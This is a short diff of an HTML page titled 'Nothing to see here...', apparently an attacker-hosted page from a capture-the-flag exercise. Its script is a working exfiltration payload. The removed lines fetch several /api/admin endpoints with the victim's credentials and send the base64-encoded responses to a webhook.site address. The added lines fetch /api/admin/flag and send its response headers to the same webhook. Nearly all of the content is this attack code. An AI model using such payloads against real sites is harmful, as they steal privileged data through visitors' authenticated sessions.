@@ -2,21 +2,9 @@
   <body>
     <h1>Nothing to see here...</h1>
    <script>
-  const target = "https://webhook.site/d8e80371-c06c-4048-b26f-aeeb548c0fa0";
-  const endpoints = [
-    '/api/admin/stats',
-    '/api/admin/users',
-    '/api/admin/config',
-    '/api/admin/logs',
-    '/api/admin/debug'
-  ];
-
-  endpoints.forEach(url => {
-    fetch(url, { credentials: 'include' })
-      .then(r => r.json())
-      .then(data => {
-        fetch(target + "?path=" + btoa(url) + "&data=" + btoa(JSON.stringify(data)));
-      }).catch(e => {});
+  fetch('/api/admin/flag').then(r => {
+    let h = ""; r.headers.forEach((v,k) => h += k+":"+v+";");
+    fetch('https://webhook.site/d8e80371-c06c-4048-b26f-aeeb548c0fa0?headers=' + btoa(h));
   });
 </script>
   </body>
